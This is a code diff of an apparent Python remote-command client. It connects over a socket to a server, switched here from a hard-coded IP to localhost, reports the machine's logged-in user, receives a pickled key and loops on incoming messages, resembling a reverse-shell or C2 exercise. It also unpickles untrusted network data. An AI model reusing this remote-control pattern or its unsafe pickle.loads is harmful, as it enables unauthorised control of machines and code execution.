@@ -13,7 +13,10 @@ from Crypto.Cipher import AES
 socket = socket.socket()
 HVA = '145.109.151.121'
 l = 'localhost'
-serverAddress = HVA, 1111
+serverAddress = l, 1111
+
+global key
+key = []
 
 
 def encryptAES(message, key):
@@ -57,9 +60,10 @@ def main():
     socket.connect(serverAddress)
     #Standard command to identify who this machine is
     socket.send(pickle.dumps(popenExecution("who").split()[0])) 
+    key = pickle.loads(socket.recv(2048))
+    print(key)
     while True:
         receive(socket)
-        time.sleep(1)
 
 
 main()
